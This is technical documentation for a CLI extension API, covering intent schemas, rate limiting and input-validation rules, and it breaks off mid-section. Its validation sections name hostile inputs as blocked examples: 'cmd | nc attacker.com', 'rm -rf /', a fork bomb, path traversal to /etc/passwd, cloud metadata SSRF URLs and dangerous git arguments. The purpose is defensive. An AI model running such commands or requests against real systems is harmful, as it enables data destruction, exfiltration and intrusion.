# Ghost Extension API Documentation

Complete reference for building Ghost CLI extensions using the I/O Intent Schema and JSON-RPC communication protocol.

## Table of Contents

- [Overview](#overview)
- [Getting Started](#getting-started)
- [I/O Intent Schema Reference](#io-intent-schema-reference)
- [Extension SDK](#extension-sdk)
- [Pipeline Architecture](#pipeline-architecture)
- [Error Response Format](#error-response-format)
- [Rate Limiting](#rate-limiting)
- [NIST SI-10 Validation Rules](#nist-si-10-validation-rules)
- [API Reference](#api-reference)
- [Examples](#examples)
- [Security Model](#security-model)
- [Troubleshooting](#troubleshooting)
- [Best Practices](#best-practices)

## Overview

Ghost CLI uses an extensible gateway architecture where extensions communicate with the host through a secure I/O pipeline using JSON-RPC intents. All operations are validated, authorized, audited, and rate-limited before execution.

### Architecture Layers

```
Extension → Intent → Pipeline → Result
                        ↓
            [Intercept → Auth → Audit → Execute]
```

1. **Intercept Layer**: Validates intent schema and normalizes messages
2. **Authorization Layer**: Checks permissions, rate limits, and capabilities
3. **Audit Layer**: Logs security events, validates content (NIST, entropy)
4. **Execution Layer**: Executes operation with circuit breakers and timeouts

## Getting Started

### 1. Scaffold a New Extension

```bash
ghost extension init my-extension
cd my-extension
npm install
```

This creates:
- `manifest.json` - Extension metadata and capabilities
- `index.js` - Main extension code
- `package.json` - NPM dependencies
- `README.md` - Documentation

### 2. Install the SDK

```bash
npm install @ghost/extension-sdk
```

### 3. Implement Your Extension

```javascript
const { ExtensionSDK } = require('@ghost/extension-sdk');

class MyExtension {
    constructor() {
        this.sdk = new ExtensionSDK('my-extension-id');
    }

    async initialize() {
        console.log('Extension initialized');
    }

    async myCommand(params) {
        const { args, flags } = params;
        
        try {
            // Your logic here
            return { success: true, output: 'Done!' };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    async shutdown() {
        console.log('Extension shutting down');
    }
}

module.exports = MyExtension;
```

### 4. Validate and Install

```bash
ghost extension validate
ghost extension install .
```

## I/O Intent Schema Reference

All extension operations use the Intent schema for communication with the Ghost pipeline. This section provides complete schema reference for all intent types.

### Intent Structure

```javascript
{
    type: string,           // Required: 'filesystem' | 'network' | 'git' | 'process'
    operation: string,      // Required: Specific operation within the type
    params: object,         // Required: Operation-specific parameters
    extensionId: string,    // Required: Your extension identifier
    requestId: string       // Optional: Auto-generated if not provided
}
```

### Filesystem Intents

Complete schema for filesystem operations with path-based access control.

#### Schema

```javascript
{
    type: 'filesystem',
    operation: string,      // Required: 'read' | 'write' | 'stat' | 'readdir' | 'mkdir' | 'unlink' | 'rmdir'
    params: {
        path: string,           // Required: file/directory path (relative or absolute)
        content?: string,       // Required for 'write' operation
        encoding?: string,      // Optional: default 'utf8' (values: 'utf8', 'ascii', 'base64', 'hex')
        recursive?: boolean     // Optional: for 'mkdir' and 'rmdir' operations
    },
    extensionId: string,
    requestId?: string
}
```

#### Valid Operations

| Operation | Description | Required Params | Optional Params | Validation |
|-----------|-------------|-----------------|-----------------|------------|
| `read` | Read file contents | `path` | `encoding` | Must match manifest read patterns |
| `write` | Write file contents | `path`, `content` | `encoding` | Must match manifest write patterns, content scanned for secrets |
| `stat` | Get file/directory stats | `path` | - | Must match manifest read patterns |
| `readdir` | List directory contents | `path` | - | Must match manifest read patterns |
| `mkdir` | Create directory | `path` | `recursive` | Must match manifest write patterns |
| `unlink` | Delete file | `path` | - | Must match manifest write patterns |
| `rmdir` | Remove directory | `path` | `recursive` | Must match manifest write patterns |

#### Parameter Validation

- **path**: Must be non-empty string, checked against path traversal attacks, validated against manifest glob patterns
- **content**: Must be string, scanned for high-entropy secrets (API keys, tokens)
- **encoding**: Must be valid Node.js encoding ('utf8', 'ascii', 'base64', 'hex', 'binary', 'ucs2', 'utf16le')
- **recursive**: Must be boolean

#### Examples

```javascript
// Read a file
{
    type: 'filesystem',
    operation: 'read',
    params: { path: './package.json' },
    extensionId: 'my-extension'
}

// Write a file with content validation
{
    type: 'filesystem',
    operation: 'write',
    params: { 
        path: './output.txt', 
        content: 'Hello, world!',
        encoding: 'utf8'
    },
    extensionId: 'my-extension'
}

// List directory (requires read permission)
{
    type: 'filesystem',
    operation: 'readdir',
    params: { path: './src' },
    extensionId: 'my-extension'
}

// Create directory recursively
{
    type: 'filesystem',
    operation: 'mkdir',
    params: { 
        path: './dist/output',
        recursive: true
    },
    extensionId: 'my-extension'
}

// Get file stats
{
    type: 'filesystem',
    operation: 'stat',
    params: { path: './file.txt' },
    extensionId: 'my-extension'
}

// Delete file
{
    type: 'filesystem',
    operation: 'unlink',
    params: { path: './temp.txt' },
    extensionId: 'my-extension'
}
```

### Network Intents

Complete schema for HTTP/HTTPS network requests with SSRF protection.

#### Schema

```javascript
{
    type: 'network',
    operation: string,              // Required: 'http' | 'https'
    params: {
        url: string,                    // Required: full URL with protocol
        method?: string,                // Optional: HTTP method (default: 'GET')
        headers?: object,               // Optional: HTTP headers as key-value pairs
        body?: string,                  // Optional: request body (must be string, use JSON.stringify for objects)
        timeout?: number                // Optional: request timeout in milliseconds (default: 30000)
    },
    extensionId: string,
    requestId?: string
}
```

#### Valid Operations

| Operation | Description | Protocol | Default Port | Validation |
|-----------|-------------|----------|--------------|------------|
| `http` | HTTP request | http:// | 80 | Must match manifest allowlist, SSRF checks applied |
| `https` | HTTPS request | https:// | 443 | Must match manifest allowlist, SSRF checks applied |

#### HTTP Methods

Supported HTTP methods (case-insensitive):
- `GET` - Retrieve data (default)
- `POST` - Create/submit data
- `PUT` - Update/replace data
- `DELETE` - Delete data
- `PATCH` - Partial update
- `HEAD` - Headers only
- `OPTIONS` - Allowed methods

#### Parameter Validation

- **url**: Must be valid URL, checked against SSRF attacks (localhost, private IPs, metadata services), validated against manifest allowlist
- **method**: Must be valid HTTP method
- **headers**: Must be object with string keys and values
- **body**: Must be string (use `JSON.stringify()` for objects)
- **timeout**: Must be positive integer (milliseconds)

#### SSRF Protection

The following are automatically blocked:
- Localhost addresses: `localhost`, `127.0.0.1`, `::1`, `0.0.0.0`
- Private IP ranges: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`
- Link-local addresses: `169.254.0.0/16`, `fe80::/10`
- Cloud metadata services: `169.254.169.254`, `metadata.google.internal`
- URL encoding obfuscation attempts

#### Examples

```javascript
// GET request
{
    type: 'network',
    operation: 'https',
    params: {
        url: 'https://api.github.com/repos/owner/repo',
        method: 'GET',
        headers: {
            'Accept': 'application/vnd.github.v3+json',
            'User-Agent': 'Ghost-Extension'
        }
    },
    extensionId: 'my-extension'
}

// POST request with JSON body
{
    type: 'network',
    operation: 'https',
    params: {
        url: 'https://api.example.com/data',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer token'
        },
        body: JSON.stringify({ key: 'value' })
    },
    extensionId: 'my-extension'
}

// Request with custom timeout
{
    type: 'network',
    operation: 'https',
    params: {
        url: 'https://api.example.com/slow-endpoint',
        method: 'GET',
        timeout: 60000  // 60 seconds
    },
    extensionId: 'my-extension'
}
```

### Git Intents

Complete schema for Git operations with read/write permission separation.

#### Schema

```javascript
{
    type: 'git',
    operation: string,      // Required: Git subcommand
    params: {
        args?: string[]         // Optional: Additional git arguments
    },
    extensionId: string,
    requestId?: string
}
```

#### Valid Operations

**Read Operations** (require `git.read: true`):

| Operation | Description | Common Args |
|-----------|-------------|-------------|
| `status` | Show working tree status | `['--short']`, `['--porcelain']` |
| `log` | Show commit logs | `['--oneline']`, `['-n', '10']`, `['--graph']` |
| `diff` | Show changes | `['HEAD']`, `['--staged']`, `['file.txt']` |
| `show` | Show commit details | `['HEAD']`, `['commit-hash']` |
| `ls-files` | List tracked files | `['--modified']`, `['--others']` |
| `branch` | List branches (read) | `['--list']`, `['--all']` |
| `tag` | List tags (read) | `['--list']` |
| `rev-parse` | Parse revision | `['HEAD']`, `['--abbrev-ref', 'HEAD']` |
| `describe` | Describe commit | `['--tags']` |
| `ls-tree` | List tree contents | `['HEAD']` |
| `cat-file` | Show file content | `['-p', 'HEAD:file.txt']` |
| `config` | Get configuration (read) | `['--get', 'user.name']` |
| `remote` | List remotes | `['-v']` |

**Write Operations** (require `git.write: true`):

| Operation | Description | Common Args | Security Notes |
|-----------|-------------|-------------|----------------|
| `commit` | Commit changes | `['-m', 'message']` | Message required |
| `branch` | Create branch | `['new-branch']` | Branch name required |
| `tag` | Create tag | `['v1.0.0']` | Tag name required |
| `push` | Push to remote | `['origin', 'main']` | Remote/branch required |
| `reset` | Reset HEAD | `['--soft', 'HEAD~1']` | Dangerous operation |

#### Parameter Validation

- **args**: Must be array of strings, checked for dangerous arguments (`--exec`, `-c`, shell injection)
- Denied arguments: `--exec`, `-c core.sshCommand`, `-c core.gitProxy`, pipe operators, semicolons
- Maximum argument length: 1000 characters per argument

#### Examples

```javascript
// Git status
{
    type: 'git',
    operation: 'status',
    params: { args: ['--short'] },
    extensionId: 'my-extension'
}

// Git log with formatting
{
    type: 'git',
    operation: 'log',
    params: { args: ['--oneline', '--graph', '-10'] },
    extensionId: 'my-extension'
}

// Git diff between commits
{
    type: 'git',
    operation: 'diff',
    params: { args: ['HEAD~1', 'HEAD'] },
    extensionId: 'my-extension'
}

// Git commit (requires write permission)
{
    type: 'git',
    operation: 'commit',
    params: { args: ['-m', 'feat: add new feature'] },
    extensionId: 'my-extension'
}

// List branches
{
    type: 'git',
    operation: 'branch',
    params: { args: ['--list', '--all'] },
    extensionId: 'my-extension'
}
```

### Process Intents

Complete schema for spawning system processes (requires explicit permission).

#### Schema

```javascript
{
    type: 'process',
    operation: string,      // Required: 'spawn' | 'exec'
    params: {
        command: string,        // Required: Command to execute
        args?: string[],        // Optional: Command arguments
        cwd?: string,           // Optional: Working directory
        env?: object,           // Optional: Environment variables
        timeout?: number        // Optional: Execution timeout (milliseconds)
    },
    extensionId: string,
    requestId?: string
}
```

#### Valid Operations

| Operation | Description | Use Case |
|-----------|-------------|----------|
| `spawn` | Spawn process with arguments | Safer, args separated from command |
| `exec` | Execute command in shell | Use with caution, shell injection risk |

#### Parameter Validation

- **command**: Must be non-empty string, checked against command injection patterns
- **args**: Must be array of strings, checked for shell metacharacters
- **cwd**: Must be valid directory path
- **env**: Must be object with string keys and values
- **timeout**: Must be positive integer (milliseconds)

#### Security Validation

Blocked patterns:
- Shell metacharacters in command: `;`, `|`, `&`, `$()`, `` ` ``, `<`, `>`
- Dangerous commands: `rm -rf`, `dd`, `mkfs`, `:(){ :|:& };:`
- Command chaining attempts
- Environment variable injection

#### Examples

```javascript
// Spawn npm test (safer)
{
    type: 'process',
    operation: 'spawn',
    params: {
        command: 'npm',
        args: ['test'],
        cwd: './my-project',
        timeout: 60000
    },
    extensionId: 'my-extension'
}

// Execute shell command (requires process:spawn permission)
{
    type: 'process',
    operation: 'exec',
    params: {
        command: 'echo "Hello World"',
        timeout: 5000
    },
    extensionId: 'my-extension'
}

// Run with custom environment
{
    type: 'process',
    operation: 'spawn',
    params: {
        command: 'node',
        args: ['script.js'],
        env: {
            NODE_ENV: 'production',
            DEBUG: 'false'
        }
    },
    extensionId: 'my-extension'
}
```

## Error Response Format

All intents return a standardized response format for both success and error cases.

### Success Response Schema

```javascript
{
    success: true,              // Always true for successful operations
    result: any,                // Operation result (type varies by operation)
    requestId: string,          // Request identifier for tracking
    warnings?: string[]         // Optional warnings (e.g., deprecations)
}
```

### Error Response Schema

```javascript
{
    success: false,             // Always false for failed operations
    error: string,              // Human-readable error message
    code: string,               // Machine-readable error code
    stage: string,              // Pipeline stage where error occurred
    requestId: string,          // Request identifier for tracking
    data?: object              // Optional additional error context
}
```

### Pipeline Stages

Errors include the `stage` field indicating where in the pipeline the error occurred:

| Stage | Description | Common Error Codes |
|-------|-------------|-------------------|
| `INTERCEPT` | Schema validation | `PIPELINE_INTERCEPT_ERROR` |
| `AUTHORIZATION` | Permission checks | `AUTH_PERMISSION_DENIED`, `AUTH_RATE_LIMIT`, `AUTH_NOT_REGISTERED` |
| `AUDIT` | Security validation | `AUDIT_VALIDATION_FAILED` |
| `EXECUTION` | Operation execution | `PIPELINE_EXECUTION_ERROR`, `TIMEOUT_EXCEEDED`, `CIRCUIT_BREAKER_OPEN` |

### Error Codes Reference

#### Authorization Layer Errors

| Code | Stage | Description | Resolution |
|------|-------|-------------|------------|
| `AUTH_NOT_REGISTERED` | AUTHORIZATION | Extension not registered with runtime | Register extension before use |
| `AUTH_PERMISSION_DENIED` | AUTHORIZATION | Missing required capability | Add capability to manifest.json |
| `AUTH_RATE_LIMIT` | AUTHORIZATION | Rate limit exceeded | Wait for token bucket refill, reduce request rate |
| `AUTH_UNKNOWN_TYPE` | AUTHORIZATION | Invalid intent type | Use 'filesystem', 'network', 'git', or 'process' |
| `PATH_NOT_ALLOWED` | AUTHORIZATION | Filesystem path not in manifest patterns | Add path pattern to capabilities.filesystem |
| `URL_NOT_ALLOWED` | AUTHORIZATION | Network URL not in allowlist | Add URL origin to capabilities.network.allowlist |

#### Audit Layer Errors

| Code | Stage | Description | Resolution |
|------|-------|-------------|------------|
| `AUDIT_VALIDATION_FAILED` | AUDIT | NIST SI-10 validation failed | Fix validation violations (see violations array) |
| `SI-10-PATH-TRAVERSAL` | AUDIT | Path traversal attempt detected | Use safe relative paths within workspace |
| `SI-10-COMMAND-INJECTION` | AUDIT | Command injection attempt detected | Remove shell metacharacters from commands |
| `SI-10-SSRF-LOCALHOST` | AUDIT | SSRF attempt to localhost | Use public URLs only |
| `SI-10-SSRF-PRIVATE-IP` | AUDIT | SSRF attempt to private IP | Use public URLs only |
| `SI-10-SSRF-METADATA` | AUDIT | SSRF attempt to cloud metadata service | Use public URLs only |
| `SI-10-CONTENT-SECRETS` | AUDIT | High-entropy secrets detected in content | Remove API keys/tokens from content |

#### Execution Layer Errors

| Code | Stage | Description | Resolution |
|------|-------|-------------|------------|
| `PIPELINE_EXECUTION_ERROR` | EXECUTION | Generic execution failure | Check operation parameters and system state |
| `TIMEOUT_EXCEEDED` | EXECUTION | Operation exceeded timeout | Increase timeout or optimize operation |
| `CIRCUIT_BREAKER_OPEN` | EXECUTION | Too many consecutive failures | Wait for circuit breaker reset |

#### Intercept Layer Errors

| Code | Stage | Description | Resolution |
|------|-------|-------------|------------|
| `PIPELINE_INTERCEPT_ERROR` | INTERCEPT | Schema validation failed | Fix intent structure (type, operation, params) |

### Error Response Examples

```javascript
// Permission denied error
{
    success: false,
    stage: 'AUTHORIZATION',
    error: 'Permission denied: network access not allowed',
    code: 'AUTH_PERMISSION_DENIED',
    requestId: 'my-extension-1234567890-abc123',
    data: {
        requiredCapability: 'network',
        extensionId: 'my-extension'
    }
}

// Rate limit exceeded
{
    success: false,
    stage: 'AUTHORIZATION',
    error: 'Rate limit exceeded',
    code: 'AUTH_RATE_LIMIT',
    requestId: 'my-extension-1234567890-def456',
    data: {
        cir: 60,
        bc: 100,
        available: 0,
        retryAfter: 5000  // milliseconds
    }
}

// Path traversal detected
{
    success: false,
    stage: 'AUDIT',
    error: 'NIST SI-10 validation failed',
    code: 'AUDIT_VALIDATION_FAILED',
    requestId: 'my-extension-1234567890-ghi789',
    violations: [
        {
            rule: 'SI-10-PATH-TRAVERSAL',
            message: 'Path traversal attempt detected',
            severity: 'high',
            detail: 'Path: ../../etc/passwd'
        }
    ]
}

// SSRF attempt blocked
{
    success: false,
    stage: 'AUDIT',
    error: 'NIST SI-10 validation failed',
    code: 'AUDIT_VALIDATION_FAILED',
    requestId: 'my-extension-1234567890-jkl012',
    violations: [
        {
            rule: 'SI-10-SSRF-LOCALHOST',
            message: 'SSRF attempt to localhost blocked',
            severity: 'critical',
            detail: 'URL: http://localhost:8080/admin'
        }
    ]
}

// Execution timeout
{
    success: false,
    stage: 'EXECUTION',
    error: 'Operation exceeded timeout of 30000ms',
    code: 'TIMEOUT_EXCEEDED',
    requestId: 'my-extension-1234567890-mno345',
    data: {
        timeout: 30000,
        operation: 'network',
        url: 'https://api.example.com/slow-endpoint'
    }
}
```

## Rate Limiting

Ghost implements Two-Rate Three-Color Marking (trTCM) traffic policing for network operations to prevent abuse and ensure fair resource usage.

### Token Bucket Algorithm

Network capabilities use a token bucket algorithm with three parameters:

#### Configuration Parameters

| Parameter | Description | Default | Manifest Field |
|-----------|-------------|---------|----------------|
| **CIR** | Committed Information Rate - sustained requests per minute | 60 | `capabilities.network.rateLimit.cir` |
| **Bc** | Burst Committed - maximum burst size (tokens) | 100 | `capabilities.network.rateLimit.bc` |
| **Be** | Burst Excess - additional burst capacity beyond Bc (optional) | 0 | `capabilities.network.rateLimit.be` |

#### How It Works

1. **Token Bucket**: Each extension gets a bucket initialized with `Bc` tokens
2. **Token Refill**: Tokens refill at `CIR` rate (tokens per minute)
3. **Token Consumption**: Each network request consumes 1 token
4. **Burst Allowance**: Bucket can hold up to `Bc` tokens (or `Bc + Be` if excess burst configured)
5. **Rate Limiting**: Request blocked if insufficient tokens available

### Three-Color Marking

Requests are classified into three colors based on token availability:

| Color | Classification | Token State | Action | HTTP Analogy |
|-------|---------------|-------------|--------|--------------|
| **Green** | Conforming | Tokens ≥ 1 and ≤ Bc | Allow | 200 OK |
| **Yellow** | Exceeding | Tokens > Bc and ≤ (Bc + Be) | Allow with warning | 200 OK (with warning) |
| **Red** | Violating | Tokens < 1 | Block | 429 Too Many Requests |

### Token Consumption Examples

#### Example 1: Normal Usage (Green)

```javascript
// Manifest configuration
{
    "capabilities": {
        "network": {
            "allowlist": ["https://api.github.com"],
            "rateLimit": {
                "cir": 60,    // 60 requests per minute
                "bc": 100     // Burst up to 100 requests
            }
        }
    }
}
```

**Scenario**: Extension makes 50 requests in first second, then 1 request per second
- Initial: 100 tokens available
- After 50 requests: 50 tokens remaining → **GREEN** (conforming)
- After 60 seconds: 50 + 60 = 110 tokens, capped at 100 → **GREEN**
- Each subsequent request: Consumes 1 token, refills at 1/min → **GREEN**

#### Example 2: Burst Usage (Yellow)

```javascript
// Manifest with excess burst
{
    "capabilities": {
        "network": {
            "allowlist": ["https://api.github.com"],
            "rateLimit": {
                "cir": 60,
                "bc": 100,
                "be": 50      // Additional 50 tokens for bursts
            }
        }
    }
}
```

**Scenario**: Extension makes 120 requests immediately
- Initial: 100 tokens (Bc)
- After 100 requests: 0 tokens → Next 20 requests use excess burst → **YELLOW**
- After 120 requests: -20 tokens → **RED** (blocked)

#### Example 3: Rate Limit Exceeded (Red)

```javascript
// Same configuration as Example 1
```

**Scenario**: Extension makes 110 requests immediately
- Initial: 100 tokens
- After 100 requests: 0 tokens
- Request 101-110: Insufficient tokens → **RED** (blocked)
- Response: `{ success: false, code: 'AUTH_RATE_LIMIT', ... }`

### Rate Limit Response

When rate limit is exceeded:

```javascript
{
    success: false,
    stage: 'AUTHORIZATION',
    error: 'Rate limit exceeded',
    code: 'AUTH_RATE_LIMIT',
    requestId: 'my-extension-1234567890-abc123',
    data: {
        cir: 60,              // Configured CIR
        bc: 100,              // Configured Bc
        available: 0,         // Current available tokens
        capacity: 100,        // Maximum capacity
        retryAfter: 5000      // Milliseconds until next token available
    }
}
```

### Manifest Configuration Examples

#### Conservative (Low Rate)

```json
{
    "capabilities": {
        "network": {
            "allowlist": ["https://api.example.com"],
            "rateLimit": {
                "cir": 30,
                "bc": 50
            }
        }
    }
}
```
- Sustained: 30 requests/minute (0.5/sec)
- Burst: Up to 50 requests immediately
- Use case: Low-frequency polling, status checks

#### Standard (Moderate Rate)

```json
{
    "capabilities": {
        "network": {
            "allowlist": ["https://api.github.com"],
            "rateLimit": {
                "cir": 60,
                "bc": 100
            }
        }
    }
}
```
- Sustained: 60 requests/minute (1/sec)
- Burst: Up to 100 requests immediately
- Use case: Regular API interactions, webhooks

#### High Throughput

```json
{
    "capabilities": {
        "network": {
            "allowlist": ["https://api.internal.com"],
            "rateLimit": {
                "cir": 120,
                "bc": 200,
                "be": 100
            }
        }
    }
}
```
- Sustained: 120 requests/minute (2/sec)
- Burst: Up to 200 requests (300 with excess)
- Use case: Batch processing, data synchronization

### Monitoring Rate Limits

Query current rate limit state:

```bash
# Via CLI
ghost gateway metrics my-extension-id

# Programmatically via SDK
const state = await sdk.getRateLimitState();
console.log(`Available tokens: ${state.available}/${state.capacity}`);
```

### Best Practices

1. **Configure Appropriately**: Set CIR/Bc based on actual usage patterns
2. **Handle Gracefully**: Catch `AUTH_RATE_LIMIT` errors and implement exponential backoff
3. **Monitor Usage**: Track token consumption to optimize rate limit configuration
4. **Batch Requests**: Use batch operations to reduce total request count
5. **Cache Results**: Cache API responses to minimize redundant requests

## NIST SI-10 Validation Rules

Ghost implements NIST SP 800-53 SI-10 (Information Input Validation) controls to prevent security vulnerabilities. All intents pass through validation checks before execution.

### Validation Architecture

```
Intent → Path Validation → Network Validation → Command Validation → Entropy Validation → Execution
              ↓                    ↓                     ↓                      ↓
         SI-10-PATH-*        SI-10-SSRF-*         SI-10-CMD-*           SI-10-SECRET-*
```

### Path Traversal Protection (SI-10-PATH-TRAVERSAL)

Prevents unauthorized filesystem access through path manipulation.

#### Blocked Patterns

| Pattern | Example | Risk |
|---------|---------|------|
| Parent directory (`..`) | `../../etc/passwd` | Access files outside workspace |
| Absolute paths | `/etc/passwd`, `C:\Windows\System32` | Access system files |
| Null bytes | `file.txt\0.jpg` | Extension bypass |
| Unicode tricks | `file\u002e\u002e/passwd` | Encoding obfuscation |
| Symlink traversal | `link -> /etc/passwd` | Indirect access |

#### Validation Rules

1. **Normalize Path**: Resolve `.`, `..`, and redundant separators
2. **Check Root**: Ensure resolved path is within workspace root
3. **Match Patterns**: Verify path matches manifest glob patterns
4. **Deny List**: Block access to sensitive paths (`.git`, `.env`, `node_modules/.bin`)

#### Example Violations

```javascript
// ❌ Path traversal attempt
{
    type: 'filesystem',
    operation: 'read',
    params: { path: '../../etc/passwd' }
}
// Error: SI-10-PATH-TRAVERSAL - Path traversal attempt detected

// ❌ Absolute path
{
    type: 'filesystem',
    operation: 'read',
    params: { path: '/etc/passwd' }
}
// Error: SI-10-PATH-TRAVERSAL - Absolute paths not allowed

// ✅ Safe relative path
{
    type: 'filesystem',
    operation: 'read',
    params: { path: './src/config.json' }
}
// Allowed if 'src/**/*.json' in manifest
```

### Command Injection Protection (SI-10-COMMAND-INJECTION)

Prevents execution of malicious commands through input injection.

#### Blocked Patterns

| Pattern | Example | Risk |
|---------|---------|------|
| Command separators | `cmd; rm -rf /` | Execute multiple commands |
| Pipe operators | `cmd | nc attacker.com` | Chain commands |
| Command substitution | `cmd $(evil)` or `` cmd `evil` `` | Execute nested commands |
| Redirection | `cmd > /etc/passwd` | Write to arbitrary files |
| Backgrounding | `cmd &` | Run commands in background |
| Logic operators | `cmd && evil` or `cmd \|\| evil` | Conditional execution |

#### Validation Rules

1. **Allowlist Commands**: Only allow explicitly declared commands in manifest
2. **Argument Validation**: Check arguments for shell metacharacters
3. **Length Limits**: Enforce maximum argument length (1000 chars)
4. **Deny List**: Block dangerous arguments (`--exec`, `-c`, `core.sshCommand`)

#### Git-Specific Validation

For Git commands, additional rules apply:

```javascript
// Denied git arguments
const deniedArgs = [
    '--exec',              // Execute arbitrary commands
    '-c',                  // Set config (can enable exec)
    'core.sshCommand',     // Override SSH command
    'core.gitProxy',       // Execute proxy command
    'uploadpack.allowFilter', // Bypass security
];

// Maximum argument length
const maxArgLength = 1000;
```

#### Example Violations

```javascript
// ❌ Command injection attempt
{
    type: 'process',
    operation: 'exec',
    params: { command: 'ls; rm -rf /' }
}
// Error: SI-10-COMMAND-INJECTION - Command chaining detected

// ❌ Dangerous git argument
{
    type: 'git',
    operation: 'log',
    params: { args: ['--exec=evil.sh'] }
}
// Error: SI-10-DANGEROUS-COMMAND-ARG - Denied argument detected

// ✅ Safe git command
{
    type: 'git',
    operation: 'log',
    params: { args: ['--oneline', '-10'] }
}
// Allowed
```

### SSRF Protection (SI-10-SSRF-*)

Prevents Server-Side Request Forgery attacks through URL validation.

#### Blocked Targets

| Category | Examples | Rule Code |
|----------|----------|-----------|
| **Localhost** | `localhost`, `127.0.0.1`, `::1`, `0.0.0.0` | `SI-10-SSRF-LOCALHOST` |
| **Private IPs** | `10.x.x.x`, `172.16-31.x.x`, `192.168.x.x` | `SI-10-SSRF-PRIVATE-IP` |
| **Link-local** | `169.254.x.x`, `fe80::/10` | `SI-10-SSRF-PRIVATE-IP` |
| **Cloud Metadata** | `169.254.169.254`, `metadata.google.internal` | `SI-10-SSRF-METADATA` |
| **Encoded URLs** | `http://2130706433/` (decimal IP), `http://0x7f.1/` | `SI-10-SSRF-ENCODED` |

#### Validation Rules

1. **Parse URL**: Validate URL structure and extract components
2. **Check Protocol**: Ensure protocol is in allowlist (http/https)
3. **Resolve Hostname**: Convert hostname to IP address
4. **Check IP Ranges**: Verify IP is not private/localhost/metadata
5. **Validate Domain**: Match against manifest allowlist
6. **Detect Obfuscation**: Check for encoded IPs, Unicode tricks

#### Private IP Ranges

```javascript
// IPv4 Private Ranges
10.0.0.0/8          // Class A private
172.16.0.0/12       // Class B private
192.168.0.0/16      // Class C private
169.254.0.0/16      // Link-local
127.0.0.0/8         // Loopback

// IPv6 Private Ranges
fc00::/7            // Unique local
fe80::/10           // Link-local
::1/128             // Loopback
```

#### Example Violations

```javascript
// ❌ Localhost access
{
    type: 'network',
    operation: 'http',
    params: { url: 'http://localhost:8080/admin' }
}
// Error: SI-10-SSRF-LOCALHOST - Localhost access blocked

// ❌ Private IP access
{
    type: 'network',
    operation: 'https',
    params: { url: 'https://192.168.1.1/router' }
}
// Error: SI-10-SSRF-PRIVATE-IP - Private IP access blocked

// ❌ Cloud metadata access
{
    type: 'network',
    operation: 'http',
    params: { url: 'http://169.254.169.254/latest/meta-data/' }
}
// Error: SI-10-SSRF-METADATA - Metadata service access blocked

// ❌ Encoded IP (decimal)
{
    type: 'network',
    operation: 'http',
    params: { url: 'http://2130706433/' }  // 127.0.0.1 in decimal
}
// Error: SI-10-SSRF-ENCODED - Obfuscated URL detected

// ✅ Public URL in allowlist
{
    type: 'network',
    operation: 'https',
    params: { url: 'https://api.github.com/repos/owner/repo' }
}
// Allowed if 'https://api.github.com' in manifest
```

### Secret Detection (SI-10-SECRET-DETECTION)

Prevents accidental exposure of API keys, tokens, and credentials.

#### Detection Methods

1. **Entropy Analysis**: Calculate Shannon entropy to detect high-randomness strings
2. **Pattern Matching**: Regex patterns for known secret formats
3. **Length Heuristics**: Check for long alphanumeric strings typical of keys

#### Entropy Thresholds

```javascript
// Entropy calculation
const entropy = calculateShannonEntropy(string);

// Classification
if (entropy > 4.5) {
    // High entropy - likely secret
    // Example: "sk_live_51HqQ8RKZ..." (Stripe key)
}
```

#### Common Secret Patterns

| Type | Pattern | Example |
|------|---------|---------|
| API Keys | `[A-Za-z0-9_-]{32,}` | `AIzaSyC7Xj8F9k2...` |
| AWS Keys | `AKIA[0-9A-Z]{16}` | `AKIAIOSFODNN7EXAMPLE` |
| GitHub Tokens | `ghp_[A-Za-z0-9]{36}` | `ghp_1234567890abcdef...` |
| JWT Tokens | `eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\..*` | `eyJhbGc...` |
| Private Keys | `-----BEGIN.*PRIVATE KEY-----` | `-----BEGIN RSA PRIVATE KEY-----` |

#### Example Violations

```javascript
// ❌ Writing file with API key
{
    type: 'filesystem',
    operation: 'write',
    params: {
        path: './config.json',
        content: '{"apiKey": "sk_live_51HqQ8RKZ..."}'
    }
}
// Error: SI-10-CONTENT-SECRETS - Secrets detected in write content

// ❌ Sending secret in network request
{
    type: 'network',
    operation: 'https',
    params: {
        url: 'https://api.example.com/log',
        method: 'POST',
        body: '{"password": "AKIAIOSFODNN7EXAMPLE"}'
    }
}
// Error: SI-10-CONTENT-SECRETS - Secrets detected in request body

// ✅ Using environment variables
{
    type: 'network',
    operation: 'https',
    params: {
        url: 'https://api.example.com/data',
        headers: {
            'Authorization': `Bearer ${process.env.API_TOKEN}`
        }
    }
}
// Allowed - secrets in environment, not in intent params
```

### Audit Logging

All validation events are logged immutably to `~/.ghost/audit.log`:

```json
{
    "timestamp": "2024-01-15T10:30:00.000Z",
    "type": "SECURITY_EVENT",
    "extensionId": "my-extension",
    "eventType": "VALIDATION_VIOLATION",
    "severity": "high",
    "rule": "SI-10-PATH-TRAVERSAL",
    "details": {
        "message": "Path traversal attempt detected",
        "detail": "Path: ../../etc/passwd",
        "requestId": "my-extension-1234567890-abc123"
    }
}
```

### Severity Levels

| Severity | Description | Examples | Action |
|----------|-------------|----------|--------|
| **Critical** | Immediate security threat | SSRF to metadata, command injection | Block + Alert |
| **High** | Significant security risk | Path traversal, secrets in content | Block + Log |
| **Medium** | Policy violation | Unauthorized command | Block + Log |
| **Low** | Suspicious activity | Unusual patterns | Allow + Log |

## Extension SDK

The `@ghost/extension-sdk` package provides high-level helpers for building extensions.

### Installation

```bash
npm install @ghost/extension-sdk
```

### ExtensionSDK Class

```javascript
const { ExtensionSDK } = require('@ghost/extension-sdk');

const sdk = new ExtensionSDK('your-extension-id');
```

### Filesystem Methods

#### requestFileRead(params)

```javascript
const content = await sdk.requestFileRead({
    path: './file.txt',
    encoding: 'utf8'  // optional
});
```

#### requestFileWrite(params)

```javascript
await sdk.requestFileWrite({
    path: './output.txt',
    content: 'Hello, world!',
    encoding: 'utf8'  // optional
});
```

#### requestFileReadDir(params)

```javascript
const files = await sdk.requestFileReadDir({
    path: './src'
});
```

#### requestFileStat(params)

```javascript
const stats = await sdk.requestFileStat({
    path: './file.txt'
});
```

### Network Methods

#### requestNetworkCall(params)

```javascript
const response = await sdk.requestNetworkCall({
    url: 'https://api.example.com/endpoint',
    method: 'POST',  // optional, defaults to GET
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({ data: 'value' })
});
```

### Git Methods

#### requestGitExec(params)

```javascript
